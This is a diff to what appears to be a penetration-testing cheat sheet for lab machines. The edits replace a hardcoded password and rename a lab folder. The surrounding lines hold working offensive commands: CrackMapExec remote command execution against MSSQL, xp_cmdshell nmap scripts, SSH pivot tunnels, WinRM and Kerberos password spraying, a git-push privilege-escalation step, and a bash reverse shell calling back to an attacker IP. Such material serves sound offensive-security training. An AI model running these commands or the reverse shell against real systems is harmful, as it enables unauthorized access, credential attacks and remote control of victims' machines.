@@ -919,14 +919,14 @@ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config
 ````
 ##### Crackmapexec
 ````
-proxychains crackmapexec mssql -d example.com -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
-proxychains crackmapexec mssql -d example.com -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
+proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148 -q 'SELECT name FROM master.dbo.sysdatabases;'
 
 ````
 ##### Logging in
 ````
 sqsh -S $IP -U sa -P CrimsonQuiltScalp193 #linux
-proxychains sqsh -S 10.10.126.148 -U example.com\\sql_svc -P Dolphin1 -D msdb #windows
+proxychains sqsh -S 10.10.126.148 -U example.com\\sql_svc -P password123 -D msdb #windows
 ````
 ##### Expliotation
 ````
@@ -2278,7 +2278,7 @@ Lets say you have compromised host 192.168.236.147 which has access to 10.10.126
 ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
 ````
 ````
-sqsh -S 127.0.0.1 -U example.com\\sql_svc -P Dolphin1 -D msdb
+sqsh -S 127.0.0.1 -U example.com\\sql_svc -P password123 -D msdb
 ````
 #### Bi-directional ssh tunnel
 ````
@@ -2324,7 +2324,7 @@ ssh -L 1433:10.10.126.148:1433 Admin@192.168.236.147 -N
 In our next command we are able to login as the sql_svc on 10.10.126.148 (MS02) as if we were 192.168.236.147 (MS01)
 ````
 ````
-sqsh -S 127.0.0.1 -U example.com\\sql_svc -P Dolphin1 -D msdb
+sqsh -S 127.0.0.1 -U example.com\\sql_svc -P password123 -D msdb
 ````
 ##### Reverse Port Foward
 ````
@@ -2445,7 +2445,7 @@ sh -i >& /dev/tcp/192.168.45.191/18030 0>&1
 chmod +x backups.sh
 ````
 ````
-GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git status            
+GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git status            
 On branch master
 Your branch is up to date with 'origin/master'.
 
@@ -2459,16 +2459,16 @@ no changes added to commit (use "git add" and/or "git commit -a")
 #### Git setup / exploit
 ````
 git config --global user.name "git"
-git config --global user.email "git@hunit" #User is the same from the private key git@
+git config --global user.email "git@userD" #User is the same from the private key git@
 ````
 ````
-GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git add --all
-IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git commit -m "PE Commit"
+GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git add --all
+IT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git commit -m "PE Commit"
 
 [master 872aa26] Commit message
  1 file changed, 1 insertion(+), 4 deletions(-)
  
- GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/Hunit/id_rsa -p 43022' git push origin master        
+ GIT_SSH_COMMAND='ssh -i /home/kali/Documents/PG/userD/id_rsa -p 43022' git push origin master        
 Enumerating objects: 5, done.
 Counting objects: 100% (5/5), done.
 Delta compression using up to 3 threads
@@ -4117,7 +4117,7 @@ sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -
 sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
 sudo crackmapexec winrm 192.168.50.75 -u dave -p 'Flowers1' -d example.com
 sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
-proxychains crackmapexec mssql -d example.com -u sql_svc -p Dolphin1  -x "whoami" 10.10.126.148
+proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148
 ````
 ````
 .\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
